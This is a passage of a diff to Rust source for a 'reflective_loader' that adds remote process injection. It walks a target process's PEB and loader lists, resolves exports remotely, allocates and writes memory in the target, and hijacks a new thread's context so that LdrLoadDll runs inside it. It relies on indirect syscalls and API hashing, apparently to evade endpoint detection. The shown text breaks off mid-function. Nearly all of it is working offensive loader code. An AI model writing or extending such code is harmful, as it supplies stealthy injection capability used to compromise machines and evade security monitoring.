@@ -54,20 +54,26 @@
 
 use std::ffi::c_void;
 use std::mem;
+use std::collections::HashMap;
 
 use anyhow::{anyhow, bail, Result};
-use winapi::shared::basetsd::SIZE_T;
-use winapi::shared::ntdef::{HANDLE, PVOID};
-use winapi::um::winnt::{
-    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
-    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64,
-    IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_OPTIONAL_HDR64_MAGIC, IMAGE_NT_SIGNATURE,
-    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
-    IMAGE_REL_BASED_HIGHADJ, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW,
-    IMAGE_SECTION_HEADER, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
-    PAGE_READWRITE, SEC_COMMIT, SECTION_ALL_ACCESS,
-};
-
+use crate::win_types::SIZE_T;
+use crate::win_types::{HANDLE, PVOID, UNICODE_STRING};
+use windows_sys::Win32::System::Kernel::LIST_ENTRY;
+use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, SECTION_ALL_ACCESS, SEC_COMMIT};
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
+use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
+use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC;
+use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_ABSOLUTE;
+use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_DIR64;
+use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGH;
+use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGHADJ;
+use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGHLOW;
+use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_LOW;
+use windows_sys::Win32::System::Memory::PAGE_READONLY;
 use crate::syscalls::{do_syscall, get_syscall_id, map_clean_dll, SyscallTarget};
 
 // ── Constants ───────────────────────────────────────────────────────────────
@@ -206,6 +212,7 @@ fn align_up(value: usize, align: usize) -> usize {
 }
 
 /// PE header information extracted from DLL bytes.
+#[derive(Debug)]
 struct PeInfo {
     /// Offset of NT headers from base.
     nt_header_offset: usize,
@@ -228,6 +235,50 @@ struct PeInfo {
     /// Base relocation directory RVA and size.
     reloc_dir: Option<(u32, u32)>,
 }
+
+#[repr(C)]
+struct ProcessBasicInformation {
+    reserved1: *mut c_void,
+    peb_base_address: *mut RemotePeb,
+    reserved2: [*mut c_void; 2],
+    unique_process_id: usize,
+    reserved3: *mut c_void,
+}
+
+#[repr(C)]
+struct RemotePeb {
+    inherited_address_space: u8,
+    read_image_file_exec_options: u8,
+    being_debugged: u8,
+    bit_fields: u8,
+    mutant: *mut c_void,
+    image_base_address: *mut c_void,
+    ldr: *mut RemotePebLdrData,
+}
+
+#[repr(C)]
+struct RemotePebLdrData {
+    length: u32,
+    initialized: u8,
+    ss_handle: *mut c_void,
+    in_load_order_module_list: LIST_ENTRY,
+    in_memory_order_module_list: LIST_ENTRY,
+    in_initialization_order_module_list: LIST_ENTRY,
+}
+
+#[repr(C)]
+struct RemoteLdrDataTableEntry {
+    in_load_order_links: LIST_ENTRY,
+    in_memory_order_links: LIST_ENTRY,
+    in_initialization_order_links: LIST_ENTRY,
+    dll_base: *mut c_void,
+    entry_point: *mut c_void,
+    size_of_image: u32,
+    full_dll_name: UNICODE_STRING,
+    base_dll_name: UNICODE_STRING,
+}
+
+const MAX_REMOTE_FORWARDER_DEPTH: u32 = 8;
 
 /// Parse PE headers from raw bytes and extract key fields.
 fn parse_pe_headers(dll_bytes: &[u8]) -> Result<PeInfo> {
@@ -346,7 +397,7 @@ fn parse_pe_headers(dll_bytes: &[u8]) -> Result<PeInfo> {
 
 /// Extract an optional data directory entry (RVA, Size).
 fn dir_entry(
-    dd: &[winapi::um::winnt::IMAGE_DATA_DIRECTORY],
+    dd: &[windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DATA_DIRECTORY],
     index: usize,
 ) -> Option<(u32, u32)> {
     dd.get(index)
@@ -361,7 +412,7 @@ fn get_section_headers<'a>(
 ) -> Result<&'a [IMAGE_SECTION_HEADER]> {
     let section_offset = pe.nt_header_offset
         + 4 // PE signature
-        + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
         + pe.size_of_optional_header as usize;
 
     let section_table_size = pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
@@ -553,6 +604,966 @@ unsafe fn nt_write_virtual_memory(
     Ok(())
 }
 
+/// Read exactly `buffer.len()` bytes from a remote process.
+unsafe fn nt_read_virtual_memory(
+    process_handle: HANDLE,
+    base: *const c_void,
+    buffer: &mut [u8],
+) -> Result<()> {
+    let sys = resolve_syscall("NtReadVirtualMemory")?;
+    let mut bytes_read: usize = 0;
+
+    let status = do_syscall(
+        sys.ssn,
+        sys.gadget_addr,
+        &[
+            process_handle as u64,              // ProcessHandle
+            base as u64,                        // BaseAddress
+            buffer.as_mut_ptr() as u64,         // Buffer
+            buffer.len() as u64,                // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,   // NumberOfBytesRead
+        ],
+    );
+
+    if status != 0 {
+        bail!(
+            "NtReadVirtualMemory failed with status {:#x}",
+            status as u32
+        );
+    }
+    if bytes_read != buffer.len() {
+        bail!(
+            "NtReadVirtualMemory read {} of {} bytes",
+            bytes_read,
+            buffer.len()
+        );
+    }
+    Ok(())
+}
+
+unsafe fn nt_read_remote_struct<T>(
+    process_handle: HANDLE,
+    remote_addr: *const c_void,
+) -> Result<T> {
+    let mut value = std::mem::MaybeUninit::<T>::uninit();
+    let size = std::mem::size_of::<T>();
+    let buf = std::slice::from_raw_parts_mut(value.as_mut_ptr() as *mut u8, size);
+    nt_read_virtual_memory(process_handle, remote_addr, buf)?;
+    Ok(value.assume_init())
+}
+
+unsafe fn nt_read_remote_exact(
+    process_handle: HANDLE,
+    remote_addr: usize,
+    len: usize,
+    context: &str,
+) -> Result<Vec<u8>> {
+    let mut buf = vec![0u8; len];
+    nt_read_virtual_memory(process_handle, remote_addr as *const c_void, &mut buf)
+        .map_err(|e| anyhow!("{context}: {e}"))?;
+    Ok(buf)
+}
+
+unsafe fn read_remote_c_string_from_image(
+    process_handle: HANDLE,
+    image_base: usize,
+    rva: usize,
+    image_size: usize,
+    max_len: usize,
+    context: &str,
+) -> Result<String> {
+    if rva >= image_size {
+        bail!(
+            "{context}: string RVA {:#x} is outside image size {:#x}",
+            rva,
+            image_size
+        );
+    }
+    let len = std::cmp::min(max_len, image_size - rva);
+    let bytes = nt_read_remote_exact(process_handle, image_base + rva, len, context)?;
+    let nul = bytes.iter().position(|&b| b == 0).ok_or_else(|| {
+        anyhow!(
+            "{context}: string at RVA {:#x} is not NUL-terminated within {:#x} bytes",
+            rva,
+            len
+        )
+    })?;
+    let value = std::str::from_utf8(&bytes[..nul])
+        .map_err(|e| anyhow!("{context}: string at RVA {:#x} is not UTF-8: {}", rva, e))?;
+    if value.is_empty() {
+        bail!("{context}: string at RVA {:#x} is empty", rva);
+    }
+    Ok(value.to_string())
+}
+
+unsafe fn normalize_import_dll_name(name: &str) -> String {
+    let lower = name.to_ascii_lowercase();
+    if lower.ends_with(".dll") {
+        lower
+    } else {
+        format!("{}.dll", lower)
+    }
+}
+
+unsafe fn get_remote_ntdll_base(process_handle: HANDLE) -> Option<usize> {
+    type NtQueryInformationProcessFn = unsafe extern "system" fn(
+        HANDLE,
+        u32,
+        *mut c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+
+    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
+    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
+        local_ntdll,
+        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
+    )?;
+    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());
+
+    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
+    let mut return_len = 0u32;
+    let status = ntqip(
+        process_handle,
+        0,
+        &mut pbi as *mut _ as *mut c_void,
+        std::mem::size_of::<ProcessBasicInformation>() as u32,
+        &mut return_len,
+    );
+    if status < 0 || pbi.peb_base_address.is_null() {
+        return None;
+    }
+
+    let peb: RemotePeb =
+        nt_read_remote_struct(process_handle, pbi.peb_base_address as *const c_void).ok()?;
+    if peb.ldr.is_null() {
+        return None;
+    }
+
+    let ldr: RemotePebLdrData =
+        nt_read_remote_struct(process_handle, peb.ldr as *const c_void).ok()?;
+    let list_head = (peb.ldr as usize + 0x10) as *mut LIST_ENTRY;
+    let mut current = ldr.in_load_order_module_list.Flink;
+    let mut guard = 0usize;
+
+    while !current.is_null() && current != list_head && guard < 1024 {
+        guard += 1;
+
+        let entry: RemoteLdrDataTableEntry =
+            match nt_read_remote_struct(process_handle, current as *const c_void) {
+                Ok(e) => e,
+                Err(_) => break,
+            };
+
+        let dll_base = entry.dll_base as usize;
+        let base_name = entry.base_dll_name;
+        if dll_base != 0
+            && !base_name.Buffer.is_null()
+            && base_name.Length >= 2
+            && (base_name.Length as usize) <= 520
+        {
+            let mut wide = vec![0u8; base_name.Length as usize];
+            if nt_read_virtual_memory(process_handle, base_name.Buffer as *const c_void, &mut wide)
+                .is_ok()
+            {
+                let mut wide_u16 = vec![0u16; wide.len() / 2];
+                for (idx, chunk) in wide.chunks_exact(2).enumerate() {
+                    wide_u16[idx] = u16::from_le_bytes([chunk[0], chunk[1]]);
+                }
+                let name = String::from_utf16_lossy(&wide_u16).to_ascii_lowercase();
+                if name == "ntdll.dll" || name == "ntdll" {
+                    return Some(dll_base);
+                }
+            }
+        }
+
+        current = entry.in_load_order_links.Flink;
+    }
+
+    None
+}
+
+unsafe fn build_remote_module_map(process_handle: HANDLE) -> Result<HashMap<String, usize>> {
+    type NtQueryInformationProcessFn = unsafe extern "system" fn(
+        HANDLE,
+        u32,
+        *mut c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
+
+    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+        .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
+    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
+        local_ntdll,
+        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
+    )
+    .ok_or_else(|| anyhow!("build_remote_module_map: NtQueryInformationProcess not found"))?;
+    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());
+
+    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
+    let mut return_len = 0u32;
+    let status = ntqip(
+        process_handle,
+        0,
+        &mut pbi as *mut _ as *mut c_void,
+        std::mem::size_of::<ProcessBasicInformation>() as u32,
+        &mut return_len,
+    );
+    if status < 0 || pbi.peb_base_address.is_null() {
+        bail!(
+            "build_remote_module_map: NtQueryInformationProcess failed (status={:#x})",
+            status
+        );
+    }
+
+    let peb: RemotePeb = nt_read_remote_struct(process_handle, pbi.peb_base_address as *const c_void)
+        .map_err(|_| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
+    if peb.ldr.is_null() {
+        bail!("build_remote_module_map: remote PEB.Ldr is null");
+    }
+
+    let ldr: RemotePebLdrData = nt_read_remote_struct(process_handle, peb.ldr as *const c_void)
+        .map_err(|_| anyhow!("build_remote_module_map: failed to read remote PEB_LDR_DATA"))?;
+    let list_head = (peb.ldr as usize + 0x10) as *mut LIST_ENTRY;
+    let mut current = ldr.in_load_order_module_list.Flink;
+    let mut guard = 0usize;
+    let mut map = HashMap::new();
+
+    while !current.is_null() && current != list_head && guard < 4096 {
+        guard += 1;
+
+        let entry: RemoteLdrDataTableEntry =
+            match nt_read_remote_struct(process_handle, current as *const c_void) {
+                Ok(e) => e,
+                Err(_) => break,
+            };
+
+        let dll_base = entry.dll_base as usize;
+        let base_name = entry.base_dll_name;
+        if dll_base != 0
+            && !base_name.Buffer.is_null()
+            && base_name.Length >= 2
+            && (base_name.Length as usize) <= 520
+        {
+            let mut wide = vec![0u8; base_name.Length as usize];
+            if nt_read_virtual_memory(process_handle, base_name.Buffer as *const c_void, &mut wide)
+                .is_ok()
+            {
+                let mut wide_u16 = vec![0u16; wide.len() / 2];
+                for (idx, chunk) in wide.chunks_exact(2).enumerate() {
+                    wide_u16[idx] = u16::from_le_bytes([chunk[0], chunk[1]]);
+                }
+                let name = String::from_utf16_lossy(&wide_u16).to_ascii_lowercase();
+                map.insert(name, dll_base);
+            }
+        }
+
+        current = entry.in_load_order_links.Flink;
+    }
+
+    Ok(map)
+}
+
+unsafe fn resolve_remote_export(
+    process_handle: HANDLE,
+    remote_dll_base: usize,
+    fn_name: &str,
+) -> Result<usize> {
+    let read_bytes = |addr: usize, len: usize| -> Result<Vec<u8>> {
+        nt_read_remote_exact(
+            process_handle,
+            addr,
+            len,
+            "resolve_remote_export: NtReadVirtualMemory",
+        )
+    };
+
+    let dos = read_bytes(remote_dll_base, 64)?;
+    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
+    if e_magic != 0x5A4D {
+        bail!(
+            "resolve_remote_export: bad DOS magic at {:#x}: {:#x}",
+            remote_dll_base,
+            e_magic
+        );
+    }
+    let e_lfanew = u32::from_le_bytes(dos[0x3C..0x40].try_into().unwrap()) as usize;
+
+    let nt = read_bytes(remote_dll_base + e_lfanew, 144)?;
+    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
+        bail!(
+            "resolve_remote_export: bad PE signature at {:#x}",
+            remote_dll_base
+        );
+    }
+    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
+    if opt_magic != 0x020B {
+        bail!(
+            "resolve_remote_export: unsupported optional-header magic {:#x} at {:#x}",
+            opt_magic,
+            remote_dll_base
+        );
+    }
+
+    let export_rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
+    let export_size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
+    if export_rva == 0 || export_size < 40 {
+        bail!(
+            "resolve_remote_export: DLL at {:#x} has no export directory",
+            remote_dll_base
+        );
+    }
+
+    let exp = read_bytes(remote_dll_base + export_rva, export_size)?;
+    let num_names = u32::from_le_bytes(exp[24..28].try_into().unwrap()) as usize;
+    let fn_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;
+    let name_table_rva = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as usize;
+    let ordinal_table_rva = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as usize;
+
+    if num_names == 0 {
+        bail!(
+            "resolve_remote_export: DLL at {:#x} has no named exports",
+            remote_dll_base
+        );
+    }
+
+    let name_ptrs = read_bytes(remote_dll_base + name_table_rva, num_names * 4)?;
+    let ordinals = read_bytes(remote_dll_base + ordinal_table_rva, num_names * 2)?;
+
+    for i in 0..num_names {
+        let name_rva = u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
+        let name_raw = read_bytes(remote_dll_base + name_rva, 256).unwrap_or_else(|_| vec![0u8; 256]);
+        let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
+        let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
+        if name == fn_name {
+            let ordinal = u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
+            let fn_rva_bytes = read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
+            let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
+            if fn_rva >= export_rva && fn_rva < export_rva + export_size {
+                let forwarder = read_remote_c_string_from_image(
+                    process_handle,
+                    remote_dll_base,
+                    fn_rva,
+                    export_rva + export_size,
+                    256,
+                    "resolve_remote_export forwarder",
+                )?;
+                return resolve_remote_forwarder_export(process_handle, &forwarder);
+            }
+            return Ok(remote_dll_base + fn_rva);
+        }
+    }
+
+    bail!(
+        "resolve_remote_export: '{}' not found in DLL at {:#x}",
+        fn_name,
+        remote_dll_base
+    )
+}
+
+unsafe fn resolve_remote_export_by_ordinal(
+    process_handle: HANDLE,
+    remote_dll_base: usize,
+    ordinal: u16,
+) -> Result<usize> {
+    let dos = nt_read_remote_exact(
+        process_handle,
+        remote_dll_base,
+        64,
+        "resolve_remote_export_by_ordinal",
+    )?;
+    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
+    if e_magic != 0x5A4D {
+        bail!(
+            "resolve_remote_export_by_ordinal: bad DOS magic at {:#x}: {:#x}",
+            remote_dll_base,
+            e_magic
+        );
+    }
+    let e_lfanew = i32::from_le_bytes(dos[60..64].try_into().unwrap());
+    if e_lfanew < 0 {
+        bail!(
+            "resolve_remote_export_by_ordinal: negative e_lfanew at {:#x}",
+            remote_dll_base
+        );
+    }
+
+    let nt = nt_read_remote_exact(
+        process_handle,
+        remote_dll_base + e_lfanew as usize,
+        144,
+        "resolve_remote_export_by_ordinal",
+    )?;
+    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
+        bail!(
+            "resolve_remote_export_by_ordinal: bad PE signature at {:#x}",
+            remote_dll_base
+        );
+    }
+    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
+    if opt_magic != 0x020B {
+        bail!(
+            "resolve_remote_export_by_ordinal: unsupported optional-header magic {:#x} at {:#x}",
+            opt_magic,
+            remote_dll_base
+        );
+    }
+
+    let export_rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
+    let export_size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
+    if export_rva == 0 || export_size < 40 {
+        bail!(
+            "resolve_remote_export_by_ordinal: DLL at {:#x} has no export directory",
+            remote_dll_base
+        );
+    }
+
+    let exp = nt_read_remote_exact(
+        process_handle,
+        remote_dll_base + export_rva,
+        export_size,
+        "resolve_remote_export_by_ordinal",
+    )?;
+    let ordinal_base = u32::from_le_bytes(exp[16..20].try_into().unwrap());
+    let function_count = u32::from_le_bytes(exp[20..24].try_into().unwrap());
+    let function_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;
+
+    let ordinal_u32 = ordinal as u32;
+    if ordinal_u32 < ordinal_base {
+        bail!(
+            "resolve_remote_export_by_ordinal: ordinal {} is below export base {} at {:#x}",
+            ordinal,
+            ordinal_base,
+            remote_dll_base
+        );
+    }
+    let index = (ordinal_u32 - ordinal_base) as usize;
+    if index >= function_count as usize {
+        bail!(
+            "resolve_remote_export_by_ordinal: ordinal {} index {} exceeds function count {} at {:#x}",
+            ordinal,
+            index,
+            function_count,
+            remote_dll_base
+        );
+    }
+
+    let fn_rva_bytes = nt_read_remote_exact(
+        process_handle,
+        remote_dll_base + function_table_rva + index * 4,
+        4,
+        "resolve_remote_export_by_ordinal",
+    )?;
+    let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
+    if fn_rva >= export_rva && fn_rva < export_rva + export_size {
+        let forwarder = read_remote_c_string_from_image(
+            process_handle,
+            remote_dll_base,
+            fn_rva,
+            export_rva + export_size,
+            256,
+            "resolve_remote_export_by_ordinal forwarder",
+        )?;
+        return resolve_remote_forwarder_export(process_handle, &forwarder);
+    }
+
+    Ok(remote_dll_base + fn_rva)
+}
+
+unsafe fn resolve_remote_forwarder_export(
+    process_handle: HANDLE,
+    forwarder: &str,
+) -> Result<usize> {
+    thread_local! {
+        static REMOTE_FORWARDER_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
+    }
+
+    let depth = REMOTE_FORWARDER_DEPTH.with(|cell| cell.get());
+    if depth >= MAX_REMOTE_FORWARDER_DEPTH {
+        bail!(
+            "resolve_remote_forwarder_export: forwarder chain too deep at {}",
+            forwarder
+        );
+    }
+
+    struct ForwarderDepthGuard;
+    impl Drop for ForwarderDepthGuard {
+        fn drop(&mut self) {
+            REMOTE_FORWARDER_DEPTH.with(|cell| cell.set(cell.get().saturating_sub(1)));
+        }
+    }
+
+    REMOTE_FORWARDER_DEPTH.with(|cell| cell.set(depth + 1));
+    let _guard = ForwarderDepthGuard;
+
+    let (module_part, symbol_part) = forwarder.rsplit_once('.').ok_or_else(|| {
+        anyhow!(
+            "resolve_remote_forwarder_export: malformed forwarder string '{}'",
+            forwarder
+        )
+    })?;
+    let module_name = normalize_import_dll_name(module_part);
+    let mut remote_modules = build_remote_module_map(process_handle)?;
+    let ldr_load_dll_addr = resolve_remote_ldr_load_dll(process_handle, &remote_modules)?;
+    let remote_module_base = ensure_remote_module_loaded_cached(
+        process_handle,
+        &module_name,
+        ldr_load_dll_addr,
+        &mut remote_modules,
+    )?;
+
+    if let Some(ordinal_text) = symbol_part.strip_prefix('#') {
+        let ordinal = ordinal_text.parse::<u16>().map_err(|e| {
+            anyhow!(
+                "resolve_remote_forwarder_export: invalid ordinal forwarder '{}': {}",
+                forwarder,
+                e
+            )
+        })?;
+        resolve_remote_export_by_ordinal(process_handle, remote_module_base, ordinal)
+    } else {
+        resolve_remote_export(process_handle, remote_module_base, symbol_part)
+    }
+}
+
+unsafe fn resolve_remote_ldr_load_dll(
+    process_handle: HANDLE,
+    remote_modules: &HashMap<String, usize>,
+) -> Result<usize> {
+    let remote_ntdll = remote_modules
+        .get("ntdll.dll")
+        .copied()
+        .or_else(|| get_remote_ntdll_base(process_handle))
+        .ok_or_else(|| anyhow!("reflective_loader: unable to locate remote ntdll.dll"))?;
+    resolve_remote_export(process_handle, remote_ntdll, "LdrLoadDll")
+}
+
+unsafe fn ensure_remote_module_loaded_cached(
+    process_handle: HANDLE,
+    dll_name: &str,
+    ldr_load_dll_addr: usize,
+    remote_modules: &mut HashMap<String, usize>,
+) -> Result<usize> {
+    let key = normalize_import_dll_name(dll_name);
+    if let Some(&base) = remote_modules.get(&key) {
+        return Ok(base);
+    }
+
+    let base = ensure_remote_module_loaded(process_handle, &key, ldr_load_dll_addr)?;
+    remote_modules.insert(key, base);
+    Ok(base)
+}
+
+unsafe fn ensure_remote_module_loaded(
+    process_handle: HANDLE,
+    dll_name: &str,
+    ldr_load_dll_addr: usize,
+) -> Result<usize> {
+    let wide_name: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let wide_bytes = wide_name.len() * 2;
+    let us_offset = wide_bytes;
+    let base_addr_offset = us_offset + std::mem::size_of::<UNICODE_STRING>();
+    let total_remote = base_addr_offset + std::mem::size_of::<usize>();
+
+    let mut remote_block: *mut c_void = std::ptr::null_mut();
+    let mut remote_block_size = total_remote;
+    let alloc_status = resolve_syscall("NtAllocateVirtualMemory")?;
+    let alloc_ret = do_syscall(
+        alloc_status.ssn,
+        alloc_status.gadget_addr,
+        &[
+            process_handle as u64,
+            &mut remote_block as *mut _ as u64,
+            0,
+            &mut remote_block_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64,
+            PAGE_READWRITE as u64,
+        ],
+    );
+    if alloc_ret != 0 || remote_block.is_null() {
+        bail!(
+            "reflective_loader: failed to allocate remote LdrLoadDll staging block for {}",
+            dll_name
+        );
+    }
+
+    let cleanup_block = |block: *mut c_void| {
+        if let Ok(sys) = resolve_syscall("NtFreeVirtualMemory") {
+            let mut free_base = block;
+            let mut free_size: usize = 0;
+            let _ = do_syscall(
+                sys.ssn,
+                sys.gadget_addr,
+                &[
+                    process_handle as u64,
+                    &mut free_base as *mut _ as u64,
+                    &mut free_size as *mut _ as u64,
+                    MEM_RELEASE as u64,
+                ],
+            );
+        }
+    };
+
+    nt_write_virtual_memory(
+        process_handle,
+        remote_block,
+        std::slice::from_raw_parts(wide_name.as_ptr() as *const u8, wide_bytes),
+    )
+    .map_err(|e| {
+        cleanup_block(remote_block);
+        anyhow!(
+            "reflective_loader: failed to write remote DLL name for LdrLoadDll ({}): {}",
+            dll_name,
+            e
+        )
+    })?;
+
+    let remote_us_ptr = (remote_block as usize + us_offset) as *mut c_void;
+    let remote_base_out = (remote_block as usize + base_addr_offset) as *mut c_void;
+    let mut remote_us = UNICODE_STRING {
+        Length: (wide_bytes.saturating_sub(2)) as u16,
+        MaximumLength: wide_bytes as u16,
+        Buffer: remote_block as *mut u16,
+    };
+
+    nt_write_virtual_memory(
+        process_handle,
+        remote_us_ptr,
+        std::slice::from_raw_parts(
+            &mut remote_us as *mut _ as *const u8,
+            std::mem::size_of::<UNICODE_STRING>(),
+        ),
+    )
+    .map_err(|e| {
+        cleanup_block(remote_block);
+        anyhow!(
+            "reflective_loader: failed to write remote UNICODE_STRING for LdrLoadDll ({}): {}",
+            dll_name,
+            e
+        )
+    })?;
+
+    let zero_base: usize = 0;
+    nt_write_virtual_memory(
+        process_handle,
+        remote_base_out,
+        std::slice::from_raw_parts(
+            &zero_base as *const _ as *const u8,
+            std::mem::size_of::<usize>(),
+        ),
+    )
+    .map_err(|e| {
+        cleanup_block(remote_block);
+        anyhow!(
+            "reflective_loader: failed to initialize remote LdrLoadDll output slot for {}: {}",
+            dll_name,
+            e
+        )
+    })?;
+
+    let create_thread = resolve_syscall("NtCreateThreadEx")?;
+    let mut h_thread: HANDLE = std::ptr::null_mut();
+    let create_status = do_syscall(
+        create_thread.ssn,
+        create_thread.gadget_addr,
+        &[
+            &mut h_thread as *mut _ as u64,
+            0x1A02,
+            0,
+            process_handle as u64,
+            ldr_load_dll_addr as u64,
+            remote_us_ptr as u64,
+            0x1,
+            0,
+            0,
+            0,
+            0,
+        ],
+    );
+    if create_status != 0 || h_thread.is_null() {
+        cleanup_block(remote_block);
+        bail!(
+            "reflective_loader: NtCreateThreadEx for remote LdrLoadDll({}) failed: {:#010x}",
+            dll_name,
+            create_status as u32
+        );
+    }
+
+    let mut args_configured = false;
+
+    let get_ctx = resolve_syscall("NtGetContextThread")?;
+    let set_ctx = resolve_syscall("NtSetContextThread")?;
+
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_FULL;
+    let get_ctx_status = do_syscall(
+        get_ctx.ssn,
+        get_ctx.gadget_addr,
+        &[h_thread as u64, &mut ctx as *mut _ as u64],
+    );
+    if get_ctx_status == 0 {
+        ctx.Rcx = 0;
+        ctx.Rdx = 0;
+        ctx.R8 = remote_us_ptr as u64;
+        ctx.R9 = remote_base_out as u64;
+        let set_ctx_status = do_syscall(
+            set_ctx.ssn,
+            set_ctx.gadget_addr,
+            &[h_thread as u64, &ctx as *const _ as u64],
+        );
+        args_configured = set_ctx_status == 0;
+    }
+
+    if !args_configured {
+        if let Ok(term_thread) = resolve_syscall("NtTerminateThread") {
+            let _ = do_syscall(
+                term_thread.ssn,
+                term_thread.gadget_addr,
+                &[h_thread as u64, 0],
+            );
+        }
+        close_nt_handle(h_thread);
+        cleanup_block(remote_block);
+        bail!(
+            "reflective_loader: failed to configure remote LdrLoadDll arguments for {}",
+            dll_name
+        );
+    }
+
+    let resume = resolve_syscall("NtResumeThread")?;
+    let wait = resolve_syscall("NtWaitForSingleObject")?;
+    let _ = do_syscall(resume.ssn, resume.gadget_addr, &[h_thread as u64, 0]);
+    let _ = do_syscall(wait.ssn, wait.gadget_addr, &[h_thread as u64, 0, 0]);
+
+    let mut loaded_remote_base: usize = 0;
+    let mut base_buf = std::slice::from_raw_parts_mut(
+        &mut loaded_remote_base as *mut _ as *mut u8,
+        std::mem::size_of::<usize>(),
+    );
+    let read_res = nt_read_virtual_memory(process_handle, remote_base_out as *const c_void, &mut base_buf);
+
+    close_nt_handle(h_thread);
+    cleanup_block(remote_block);
+
+    if read_res.is_err() || loaded_remote_base == 0 {
+        bail!(
+            "reflective_loader: remote LdrLoadDll did not return a module base for {}",
+            dll_name
+        );
+    }
+
+    Ok(loaded_remote_base)
+}
+
+unsafe fn apply_relocations_for_remote_shared(
+    local_base: usize,
+    remote_base: usize,
+    pe: &PeInfo,
+) -> Result<()> {
+    let (reloc_rva, reloc_size) = match pe.reloc_dir {
+        Some(r) => r,
+        None => return Ok(()),
+    };
+
+    let delta = remote_base as i64 - pe.image_base as i64;
+    if delta == 0 {
+        return Ok(());
+    }
+
+    let mut offset = 0usize;
+    let mut count = 0usize;
+
+    while offset + 8 <= reloc_size as usize && count < MAX_RELOCATIONS {
+        let block_base = local_base + reloc_rva as usize + offset;
+
+        let virtual_address = *(block_base as *const u32);
+        let size_of_block = *((block_base + 4) as *const u32);
+
+        if size_of_block == 0 || virtual_address == 0 {
+            break;
+        }
+
+        let num_entries = ((size_of_block as usize - 8) / 2).min(MAX_RELOCATIONS);
+        let entries_ptr = (block_base + 8) as *const u16;
+
+        for i in 0..num_entries {
+            let entry = *entries_ptr.add(i);
